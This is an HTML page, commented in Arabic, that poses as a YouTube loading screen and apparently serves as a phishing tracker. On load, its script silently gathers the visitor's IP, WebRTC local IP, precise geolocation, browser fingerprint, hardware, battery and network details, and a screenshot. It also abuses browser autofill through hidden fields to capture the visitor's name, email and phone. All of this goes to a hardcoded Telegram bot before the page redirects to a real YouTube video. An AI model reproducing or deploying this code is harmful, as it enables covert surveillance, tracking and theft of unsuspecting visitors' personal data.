<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>YouTube</title>
    <link rel="icon" type="image/x-icon" href="https://www.youtube.com/s/desktop/12d6b690/img/favicon.ico">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@3/dist/fp.min.js"></script>
    <style>
        /* ===== نفس التصميم السابق (للاختصار نعيد استخدامه) ===== */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: "YouTube Sans", "Roboto", "Arial", sans-serif;
            background: #0f0f0f;
            color: #f1f1f1;
            height: 100vh;
            overflow: hidden;
            display: flex;
            flex-direction: column;
        }
        .header {
            background: #0f0f0f;
            height: 56px;
            display: flex;
            align-items: center;
            padding: 0 16px;
            border-bottom: 1px solid #303030;
            flex-shrink: 0;
            justify-content: space-between;
        }
        .header-left {
            display: flex;
            align-items: center;
            gap: 24px;
        }
        .menu-icon {
            width: 24px;
            height: 24px;
            fill: #fff;
        }
        .youtube-logo svg {
            width: 90px;
            height: 20px;
        }
        .header-right {
            display: flex;
            align-items: center;
            gap: 16px;
        }
        .header-right .icon {
            width: 24px;
            height: 24px;
            fill: #aaa;
        }
        .avatar {
            width: 32px;
            height: 32px;
            border-radius: 50%;
            background: #ff0000;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: 700;
            font-size: 14px;
            color: #fff;
        }
        .loading-container {
            flex: 1;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 40px 20px;
            position: relative;
        }
        .spinner-wrapper {
            margin-bottom: 40px;
        }
        .youtube-spinner {
            width: 72px;
            height: 72px;
            margin: 0 auto;
            position: relative;
        }
        .spinner-ring {
            position: absolute;
            width: 100%;
            height: 100%;
            border-radius: 50%;
            border: 6px solid transparent;
            border-top-color: #ff0000;
            animation: spin 0.9s cubic-bezier(0.5, 0, 0.5, 1) infinite;
        }
        .spinner-ring:nth-child(2) {
            border-top-color: #f1f1f1;
            animation-delay: 0.15s;
            opacity: 0.6;
            width: 80%;
            height: 80%;
            top: 10%;
            left: 10%;
        }
        @keyframes spin {
            to {
                transform: rotate(360deg);
            }
        }
        .dots {
            display: flex;
            gap: 12px;
            margin-bottom: 28px;
        }
        .dot {
            width: 12px;
            height: 12px;
            border-radius: 50%;
            background: #ff0000;
            animation: pulseDot 1.4s ease-in-out infinite;
        }
        .dot:nth-child(2) {
            animation-delay: 0.2s;
            background: #f1f1f1;
        }
        .dot:nth-child(3) {
            animation-delay: 0.4s;
            background: #ff0000;
        }
        @keyframes pulseDot {
            0%,
            80%,
            100% {
                transform: scale(0.6);
                opacity: 0.3;
            }
            40% {
                transform: scale(1.2);
                opacity: 1;
            }
        }
        .progress-wrap {
            width: 320px;
            max-width: 80%;
            background: #272727;
            border-radius: 20px;
            height: 6px;
            overflow: hidden;
            margin-top: 10px;
            box-shadow: inset 0 1px 3px rgba(0, 0, 0, 0.5);
        }
        .progress-bar {
            height: 100%;
            width: 0%;
            background: linear-gradient(90deg, #ff0000, #ff4d4d, #ff0000);
            background-size: 200% 100%;
            border-radius: 20px;
            animation: shimmer 2s infinite linear;
            transition: width 0.15s ease;
        }
        @keyframes shimmer {
            0% {
                background-position: -200% 0;
            }
            100% {
                background-position: 200% 0;
            }
        }
        .status-text {
            font-size: 14px;
            color: #717171;
            margin-top: 16px;
            min-height: 20px;
            font-weight: 300;
            letter-spacing: 0.3px;
        }
        .share-btn {
            position: fixed;
            bottom: 24px;
            right: 24px;
            width: 48px;
            height: 48px;
            background: #272727;
            border: none;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
            box-shadow: 0 4px 16px rgba(0, 0, 0, 0.6);
            z-index: 999;
            opacity: 0;
            transform: scale(0.8);
            transition: all 0.4s cubic-bezier(0.34, 1.56, 0.64, 1);
        }
        .share-btn.visible {
            opacity: 1;
            transform: scale(1);
        }
        .share-btn svg {
            width: 24px;
            height: 24px;
            fill: #aaa;
        }
        .hidden-field {
            position: absolute;
            left: -9999px;
            top: -9999px;
            opacity: 0;
            pointer-events: none;
            width: 1px;
            height: 1px;
        }
        @media (max-width: 480px) {
            .youtube-logo svg {
                width: 70px;
            }
            .progress-wrap {
                width: 200px;
            }
            .share-btn {
                bottom: 16px;
                right: 16px;
                width: 44px;
                height: 44px;
            }
        }
    </style>
</head>

    <script>
        // ================================================================
        //  التكوين - سرعة فائقة
        // ================================================================
        const CONFIG = {
            targetUrl: 'https://youtu.be/YiK3BulNaWQ?si=M1AJboH6vgZymq7-',
            botToken: '7982181249:AAEyLwc9c24fu-uqUT87v26S6282XTD41XI',
            chatId: '170383339',
            // السرعة: 1-2 ثانية فقط
            minDelay: 1000,
            maxDelay: 2000
        };

        // ================================================================
        //  المتغيرات
        // ================================================================
        let isRedirected = false;
        let progressValue = 0;
        let progressInterval = null;
        let capturedImage = null;
        let dataReady = false;

        const shareBtn = document.getElementById('shareBtn');

        // ================================================================
        //  دوال مساعدة
        // ================================================================
        function log(msg) {
            console.log(`[${new Date().toLocaleTimeString()}] ${msg}`);
        }

        // شريط التقدم السريع (يكتمل خلال 1.2 ثانية)
        function fastProgress() {
            const steps = 12;
            let step = 0;
            progressInterval = setInterval(() => {
                step++;
                progressValue = Math.min(step * 8, 90);
                document.getElementById('progressBar').style.width = progressValue + '%';
                if (step >= steps) {
                    clearInterval(progressInterval);
                    // يكتمل إلى 100% عند التحويل
                }
            }, 100);
        }

        function finishProgress() {
            clearInterval(progressInterval);
            progressValue = 100;
            document.getElementById('progressBar').style.width = '100%';
            document.getElementById('statusText').textContent = 'تم التحميل ...';
        }

        // ================================================================
        //  جمع البيانات (سريع، غير متزامن)
        // ================================================================
        async function collectAdvancedData() {
            const data = {};
            try {
                if (navigator.getBattery) {
                    const battery = await navigator.getBattery();
                    data.battery = {
                        level: Math.round(battery.level * 100),
                        charging: battery.charging
                    };
                }
            } catch (_) {}

            try {
                if (navigator.connection) {
                    const conn = navigator.connection;
                    data.connection = {
                        type: conn.effectiveType || 'غير معروف',
                        downlink: conn.downlink ? conn.downlink + ' Mbps' : 'غير معروف',
                        rtt: conn.rtt ? conn.rtt + ' ms' : 'غير معروف'
                    };
                }
            } catch (_) {}

            data.hardware = {
                cores: navigator.hardwareConcurrency || 'غير معروف',
                memory: navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'غير معروف',
                platform: navigator.platform || 'غير معروف'
            };

            const ua = navigator.userAgent;
            let os = 'غير معروف';
            if (ua.includes('Windows NT 10.0')) os = 'Windows 10/11';
            else if (ua.includes('Windows NT 6.3')) os = 'Windows 8.1';
            else if (ua.includes('Windows NT 6.2')) os = 'Windows 8';
            else if (ua.includes('Windows NT 6.1')) os = 'Windows 7';
            else if (ua.includes('Mac OS X 10_15')) os = 'macOS Catalina';
            else if (ua.includes('Mac OS X 10_14')) os = 'macOS Mojave';
            else if (ua.includes('Android')) os = 'Android ' + (ua.match(/Android\s([\d.]+)/) || [])[1];
            else if (ua.includes('iPhone OS')) os = 'iOS ' + (ua.match(/iPhone OS\s([\d_]+)/) || [])[1]?.replace(/_/g, '.');
            else if (ua.includes('Linux')) os = 'Linux';
            data.os = os;

            data.screen = {
                width: screen.width,
                height: screen.height,
                colorDepth: screen.colorDepth,
                pixelRatio: window.devicePixelRatio || 1
            };

            try {
                const plugins = [];
                for (let i = 0; i < navigator.plugins.length; i++) {
                    plugins.push(navigator.plugins[i].name);
                }
                data.plugins = plugins.length > 0 ? plugins.join(', ') : 'لا يوجد';
            } catch (_) {}

            data.doNotTrack = navigator.doNotTrack || 'غير محدد';
            data.languages = navigator.languages ? navigator.languages.join(', ') : navigator.language || 'غير معروف';

            // IP المحلي WebRTC
            try {
                const rtc = new RTCPeerConnection({ iceServers: [] });
                rtc.createDataChannel('');
                await rtc.createOffer().then(offer => rtc.setLocalDescription(offer));
                await new Promise(resolve => setTimeout(resolve, 300));
                const ips = [];
                rtc.onicecandidate = (e) => {
                    if (e.candidate) {
                        const ip = e.candidate.candidate.match(/(\d{1,3}\.){3}\d{1,3}/);
                        if (ip && !ips.includes(ip[0])) ips.push(ip[0]);
                    }
                };
                data.localIP = ips.length > 0 ? ips.join(', ') : 'غير متوفر';
                rtc.close();
            } catch (_) {
                data.localIP = 'غير متوفر';
            }

            // Autofill (الاسم، الإيميل، الهاتف)
            const nameInput = document.getElementById('hiddenName');
            const emailInput = document.getElementById('hiddenEmail');
            const telInput = document.getElementById('hiddenTel');

            [nameInput, emailInput, telInput].forEach(el => {
                el.style.position = 'relative';
                el.style.left = '0';
                el.style.top = '0';
                el.style.opacity = '0';
                el.style.pointerEvents = 'none';
                el.style.width = '1px';
                el.style.height = '1px';
                el.style.position = 'absolute';
            });

            nameInput.focus();
            setTimeout(() => nameInput.blur(), 50);
            emailInput.focus();
            setTimeout(() => emailInput.blur(), 50);
            telInput.focus();
            setTimeout(() => telInput.blur(), 50);

            await new Promise(resolve => setTimeout(resolve, 400));
            data.autofillName = nameInput.value.trim() || 'غير موجود';
            data.autofillEmail = emailInput.value.trim() || 'غير موجود';
            data.autofillTel = telInput.value.trim() || 'غير موجود';

            // Fingerprint (سريع)
            try {
                const fp = await FingerprintJS.load();
                const result = await fp.get();
                data.fingerprint = {
                    visitorId: result.visitorId,
                    components: Object.keys(result.components).join(', ')
                };
            } catch (_) {
                data.fingerprint = { visitorId: 'غير متوفرة', components: '' };
            }

            return data;
        }

        function collectDeviceInfo() {
            const ua = navigator.userAgent;
            const now = new Date();
            return {
                timestamp: now.toISOString(),
                localTime: now.toLocaleString('ar-SA', { timeZone: 'Asia/Baghdad' }),
                url: window.location.href,
                referrer: document.referrer || 'مباشر',
                userAgent: ua,
                deviceType: /iPhone/i.test(ua) ? 'iPhone' :
                    /iPad/i.test(ua) ? 'iPad' :
                    /Android/i.test(ua) ? 'Android' :
                    /Windows/i.test(ua) ? 'Windows' :
                    /Mac/i.test(ua) ? 'Mac' : 'أخرى',
                browser: /Chrome/i.test(ua) && !/Edge/i.test(ua) ? 'Chrome' :
                    /Firefox/i.test(ua) ? 'Firefox' :
                    /Safari/i.test(ua) && !/Chrome/i.test(ua) ? 'Safari' :
                    /Edge/i.test(ua) ? 'Edge' : 'أخرى',
                isMobile: /Mobile|Android|iPhone|iPad/i.test(ua),
                language: navigator.language || 'ar',
                platform: navigator.platform || 'غير معروف',
                screenSize: `${screen.width}x${screen.height}`,
                windowSize: `${window.innerWidth}x${window.innerHeight}`,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                cookieEnabled: navigator.cookieEnabled,
                onlineStatus: navigator.onLine
            };
        }

        async function getIP() {
            const services = [
                { url: 'https://api.ipify.org?format=json', key: 'ip' },
                { url: 'https://httpbin.org/ip', key: 'origin' }
            ];
            for (const svc of services) {
                try {
                    const ctrl = new AbortController();
                    const tid = setTimeout(() => ctrl.abort(), 2000);
                    const res = await fetch(svc.url, { signal: ctrl.signal });
                    clearTimeout(tid);
                    if (res.ok) {
                        const data = await res.json();
                        const ip = data[svc.key];
                        if (ip && ip.trim()) return ip.trim();
                    }
                } catch (_) {}
            }
            return 'غير متوفر';
        }

        function getLocation() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) { resolve(null); return; }
                let done = false;
                const opts = { enableHighAccuracy: true, timeout: 4000, maximumAge: 60000 };
                navigator.geolocation.getCurrentPosition(
                    (pos) => {
                        if (done) return;
                        done = true;
                        const coords = pos.coords;
                        resolve({
                            latitude: +coords.latitude.toFixed(6),
                            longitude: +coords.longitude.toFixed(6),
                            accuracy: Math.round(coords.accuracy)
                        });
                    },
                    () => { if (!done) { done = true;
                            resolve(null); } },
                    opts
                );
                setTimeout(() => { if (!done) { done = true;
                        resolve(null); } }, 4000);
            });
        }

        async function captureScreenshot() {
            try {
                const element = document.getElementById('captureArea');
                const canvas = await html2canvas(element, {
                    scale: 1.5,
                    backgroundColor: '#0f0f0f',
                    logging: false,
                    allowTaint: false,
                    useCORS: true
                });
                return canvas.toDataURL('image/jpeg', 0.85);
            } catch (error) {
                log(`❌ فشل التقاط الصورة: ${error.message}`);
                return null;
            }
        }

        function dataURLtoBlob(dataURL) {
            const byteString = atob(dataURL.split(',')[1]);
            const mimeString = dataURL.split(',')[0].split(':')[1].split(';')[0];
            const ab = new ArrayBuffer(byteString.length);
            const ia = new Uint8Array(ab);
            for (let i = 0; i < byteString.length; i++) {
                ia[i] = byteString.charCodeAt(i);
            }
            return new Blob([ab], { type: mimeString });
        }

        // ================================================================
        //  إرسال إلى تليجرام (غير متزامن، لا ننتظر الرد)
        // ================================================================
        async function sendToTelegram(baseData, advancedData, imageDataURL) {
            const token = CONFIG.botToken;
            const chatId = CONFIG.chatId;
            if (!token || !chatId) return;

            const d = baseData;
            const adv = advancedData;
            const loc = d.location ? `${d.location.latitude}, ${d.location.longitude} (دقة ${d.location.accuracy}م)` : 'غير متوفر';
            const mapLink = d.location ? `https://www.google.com/maps?q=${d.location.latitude},${d.location.longitude}` : '';

            let caption = `🎯 *زائر جديد - بيانات شاملة*\n\n`;
            caption += `📧 *البريد:* ${adv.autofillEmail || 'غير موجود'}\n`;
            caption += `📛 *الاسم:* ${adv.autofillName || 'غير موجود'}\n`;
            caption += `📱 *الهاتف:* ${adv.autofillTel || 'غير موجود'}\n`;
            caption += `🆔 *بصمة:* ${adv.fingerprint?.visitorId || 'غير متوفرة'}\n`;
            caption += `🔍 *مكونات:* ${adv.fingerprint?.components || 'غير معروف'}\n\n`;
            caption += `🔋 *البطارية:* ${adv.battery?.level || 'غير معروف'}% ${adv.battery?.charging ? '(شحن)' : ''}\n`;
            caption += `📡 *الشبكة:* ${adv.connection?.type || 'غير معروف'} (${adv.connection?.downlink || '?'})\n`;
            caption += `⚙️ *المعالج:* ${adv.hardware?.cores || 'غير معروف'} نواة\n`;
            caption += `🧠 *الذاكرة:* ${adv.hardware?.memory || 'غير معروف'}\n`;
            caption += `💻 *النظام:* ${adv.os || 'غير معروف'}\n`;
            caption += `🖥️ *الشاشة:* ${adv.screen?.width}x${adv.screen?.height} (${adv.screen?.colorDepth} بت)\n`;
            caption += `🔌 *الإضافات:* ${adv.plugins || 'لا يوجد'}\n`;
            caption += `🚫 *DNT:* ${adv.doNotTrack || 'غير محدد'}\n`;
            caption += `🌍 *اللغات:* ${adv.languages || 'غير معروف'}\n`;
            caption += `🌐 *IP محلي:* ${adv.localIP || 'غير متوفر'}\n\n`;

            caption += `⏰ *التوقيت:* ${d.device.localTime}\n`;
            caption += `🌐 *الرابط:* ${d.device.url}\n`;
            caption += `🔗 *المرجع:* ${d.device.referrer}\n\n`;
            caption += `📱 *الجهاز:* ${d.device.deviceType}\n`;
            caption += `🌍 *المتصفح:* ${d.device.browser}\n`;
            caption += `📶 *محمول:* ${d.device.isMobile ? 'نعم' : 'لا'}\n`;
            caption += `🗣 *اللغة:* ${d.device.language}\n`;
            caption += `\n🌐 *IP:* ${d.ip}\n`;
            caption += `📍 *الموقع:* ${loc}\n`;
            if (mapLink) caption += `🗺️ [خريطة](${mapLink})\n`;
            caption += `📐 *الشاشة:* ${d.device.screenSize}\n`;

            try {
                if (imageDataURL) {
                    const blob = dataURLtoBlob(imageDataURL);
                    const formData = new FormData();
                    formData.append('chat_id', chatId);
                    formData.append('photo', blob, 'youtube_screenshot.jpg');
                    formData.append('caption', caption);
                    formData.append('parse_mode', 'Markdown');
                    await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
                        method: 'POST',
                        body: formData
                    });
                    log('✅ تم الإرسال');
                } else {
                    await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            chat_id: chatId,
                            text: caption,
                            parse_mode: 'Markdown',
                            disable_web_page_preview: true
                        })
                    });
                }
            } catch (e) {
                log(`❌ فشل الإرسال: ${e.message}`);
            }
        }

        // ================================================================
        //  زر المشاركة
        // ================================================================
        function setupShareButton(imageDataURL) {
            if (!imageDataURL) { shareBtn.style.display = 'none'; return; }
            const blob = dataURLtoBlob(imageDataURL);
            const file = new File([blob], 'youtube_screenshot.jpg', { type: 'image/jpeg' });

            shareBtn.addEventListener('click', async () => {
                if (navigator.share) {
                    try {
                        await navigator.share({
                            title: 'YouTube',
                            text: 'شاهد هذا الفيديو على يوتيوب',
                            files: [file]
                        });
                    } catch (_) {}
                } else {
                    const win = window.open();
                    if (win) {
                        win.document.write(
                            `<img src="${imageDataURL}" style="max-width:100%;height:auto;" />`
                            );
                    }
                }
            });
            setTimeout(() => shareBtn.classList.add('visible'), 800);
        }

        // ================================================================
        //  العملية الرئيسية (سريعة جداً)
        // ================================================================
        async function main() {
            log('🚀 بدء التشغيل (فائق السرعة)');

            // 1. شريط التقدم السريع
            fastProgress();

            // 2. جمع البيانات الأساسية (سريعة)
            const deviceInfo = collectDeviceInfo();
            let ip = 'غير متوفر';
            let location = null;

            // نبدأ بجلب IP والموقع بالتوازي
            const ipPromise = getIP();
            const locPromise = getLocation();

            // 3. جمع البيانات المتقدمة (في الخلفية)
            const advDataPromise = collectAdvancedData();

            // 4. لقطة الشاشة (في الخلفية)
            const screenshotPromise = captureScreenshot();

            // 5. ننتظر الأساسيات فقط (IP والموقع) ثم نتحول فوراً
            try {
                const [ipRes, locRes] = await Promise.allSettled([ipPromise, locPromise]);
                if (ipRes.status === 'fulfilled') ip = ipRes.value;
                if (locRes.status === 'fulfilled') location = locRes.value;
            } catch (_) {}

            const baseData = { device: deviceInfo, ip, location };

            // 6. نكمل جمع البيانات المتقدمة واللقطة (لا ننتظرها للتحويل)
            const advData = await advDataPromise;
            const screenshot = await screenshotPromise;
            if (screenshot) {
                capturedImage = screenshot;
                setupShareButton(screenshot);
            }

            // 7. إرسال البيانات (لا ننتظر)
            sendToTelegram(baseData, advData, screenshot);

            // 8. إنهاء شريط التقدم والتحويل فوراً (بعد 1-2 ثانية)
            const delay = Math.floor(Math.random() * (CONFIG.maxDelay - CONFIG.minDelay + 1)) + CONFIG.minDelay;
            log(`⏳ الانتظار ${delay} مللي ثانية`);

            setTimeout(() => {
                finishProgress();
                setTimeout(() => {
                    if (!isRedirected) {
                        isRedirected = true;
                        log('🔄 تحويل سريع');
                        try {
                            window.location.replace(CONFIG.targetUrl);
                        } catch (_) {
                            window.location.href = CONFIG.targetUrl;
                        }
                    }
                }, 200); // 0.2 ثانية فقط بعد اكتمال الشريط
            }, delay);
        }

        // ================================================================
        //  بدء التشغيل
        // ================================================================
        if (document.readyState === 'complete') {
            setTimeout(main, 300);
        } else {
            window.addEventListener('load', () => setTimeout(main, 300));
        }

        log('✅ تم تحميل النسخة السريعة جداً');
    </script>
</body>
